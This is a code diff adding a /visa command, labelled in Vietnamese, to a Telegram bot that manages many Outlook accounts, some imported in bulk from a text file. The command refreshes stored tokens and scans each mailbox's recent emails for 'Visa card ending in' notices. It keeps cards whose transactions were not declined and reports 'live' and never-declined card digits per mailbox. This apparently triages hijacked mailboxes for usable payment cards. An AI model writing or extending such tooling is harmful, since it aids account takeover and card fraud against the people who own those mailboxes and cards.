@@ -67,6 +67,7 @@ class OutlookTelegramBot {
         this.setupMainMenu();
         this.setupHelp();
         this.setupInboxCommand();
+        this.setupVisaCommand();
         this.setupAuthCallback();
         this.setupErrorHandler();
 
@@ -89,6 +90,7 @@ class OutlookTelegramBot {
 
                 '📧 *ACCOUNT & EMAIL MANAGEMENT*\n' +
                 '├ /inbox - Xem các email gần nhất\n' +
+                '├ /visa - Lọc số thẻ Visa (không bị DECLINED)\n' +
                 '├ /add - Thêm tài khoản Outlook\n' +
                 '├ /addall - Thêm hàng loạt từ file .txt\n' +
                 '├ /remove [email] - Xóa tài khoản\n' +
@@ -381,6 +383,140 @@ class OutlookTelegramBot {
             } catch (error) {
                 console.error('❌ /inbox command error:', error.message);
                 await safeSendMessage(this.bot, chatId, `❌ Lỗi khi tải hộp thư: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
+            }
+        });
+    }
+
+    setupVisaCommand() {
+        this.bot.onText(/^\/visa(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
+            const chatId = msg.chat.id;
+            const arg = match?.[1]?.trim().toLowerCase();
+
+            try {
+                let query = { telegramChatId: chatId.toString(), status: 'active' };
+                if (arg && arg.includes('@')) {
+                    query.email = arg;
+                }
+
+                const accounts = await Account.find(query).lean();
+                if (!accounts || accounts.length === 0) {
+                    return safeSendMessage(this.bot, chatId, '❌ Không tìm thấy tài khoản nào đang hoạt động.');
+                }
+
+                const statusMsg = await safeSendMessage(
+                    this.bot,
+                    chatId,
+                    `🔍 Đang quét *${accounts.length}* hộp thư để lọc các thẻ **Visa ending in (XXXX)** có giao dịch thành công (*không bị DECLINED*)...`,
+                    { parse_mode: 'Markdown' }
+                );
+
+                const GraphClient = require('../outlook/graph');
+                const results = [];
+                const BATCH_SIZE = 25;
+
+                for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
+                    const batch = accounts.slice(i, i + BATCH_SIZE);
+                    await Promise.all(batch.map(async (acc) => {
+                        try {
+                            let token = null;
+                            if (acc.accessToken && acc.tokenExpiry && new Date(acc.tokenExpiry).getTime() - Date.now() > 120000) {
+                                token = decryptToken(acc.accessToken);
+                            } else {
+                                const tr = await this.outlookAuth.refreshAccessToken(decryptToken(acc.refreshToken));
+                                if (tr.success) token = tr.accessToken;
+                            }
+                            if (!token) return;
+
+                            const graph = new GraphClient(token);
+                            const res = await graph.request(
+                                'GET',
+                                '/me/messages?$top=30&$orderby=receivedDateTime desc&$select=subject,bodyPreview,receivedDateTime'
+                            );
+                            const msgs = res.value || [];
+
+                            const usedCards = new Map(); // card -> latest detail
+                            const declinedSet = new Set();
+
+                            for (const m of msgs) {
+                                const fullText = `${m.subject || ''} ${m.bodyPreview || ''}`;
+                                const cardMatch = fullText.match(/Visa card ending in\s*\(?(\d{4})\)?/i);
+                                if (!cardMatch) continue;
+
+                                const card = cardMatch[1];
+                                const isDeclined = /declined/i.test(fullText);
+
+                                if (isDeclined) {
+                                    declinedSet.add(card);
+                                } else if (/was recently used/i.test(fullText)) {
+                                    if (!usedCards.has(card)) {
+                                        const cleanPreview = (m.bodyPreview || '')
+                                            .replace(/_+/g, '')
+                                            .replace(/\s+/g, ' ')
+                                            .trim();
+                                        usedCards.set(card, {
+                                            card,
+                                            preview: cleanPreview.slice(0, 120),
+                                            time: m.receivedDateTime
+                                        });
+                                    }
+                                }
+                            }
+
+                            if (usedCards.size > 0) {
+                                const cardsArr = Array.from(usedCards.values()).map(item => ({
+                                    ...item,
+                                    neverDeclined: !declinedSet.has(item.card)
+                                }));
+                                results.push({
+                                    email: acc.email,
+                                    cards: cardsArr
+                                });
+                            }
+                        } catch (e) {}
+                    }));
+                }
+
+                if (statusMsg?.message_id) {
+                    await this.bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
+                }
+
+                if (results.length === 0) {
+                    return safeSendMessage(this.bot, chatId, '📭 Không tìm thấy email thẻ Visa nào có giao dịch thành công (không bị DECLINED).');
+                }
+
+                const allUniqueCards = [...new Set(results.flatMap(r => r.cards.map(c => c.card)))];
+                const neverDeclinedUnique = [...new Set(results.flatMap(r => r.cards.filter(c => c.neverDeclined).map(c => c.card)))];
+
+                let headerMsg = `💳 *KẾT QUẢ LỌC THẺ VISA (KHÔNG BỊ DECLINED)*\n`;
+                headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                headerMsg += `📧 Số hộp thư có thẻ sống: *${results.length}*\n`;
+                headerMsg += `🔢 Tổng số đuôi thẻ (4 số): *${allUniqueCards.length}*\n`;
+                headerMsg += `💎 Chưa từng bị Declined lần nào (${neverDeclinedUnique.length}): \`${neverDeclinedUnique.join(', ') || 'Không có'}\`\n\n`;
+                headerMsg += `📋 *Danh sách toàn bộ mã 4 số (used online/phone):*\n\`${allUniqueCards.join(', ')}\`\n`;
+                headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+                let currentChunk = headerMsg;
+                for (let idx = 0; idx < results.length; idx++) {
+                    const r = results[idx];
+                    const cardStr = r.cards
+                        .map(c => c.neverDeclined ? `*${c.card}* 💎` : `*${c.card}*`)
+                        .join(', ');
+                    const sample = escapeMarkdown(r.cards[0]?.preview || '');
+                    const line = `${idx + 1}. \`${escapeMarkdown(r.email)}\` → 💳 ${cardStr}\n   └ _${sample}_\n\n`;
+
+                    if (currentChunk.length + line.length > 3800) {
+                        await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
+                        currentChunk = '';
+                    }
+                    currentChunk += line;
+                }
+
+                if (currentChunk) {
+                    await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
+                }
+            } catch (error) {
+                console.error('❌ /visa command error:', error.message);
+                await safeSendMessage(this.bot, chatId, `❌ Lỗi khi quét thẻ Visa: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
             }
         });
     }
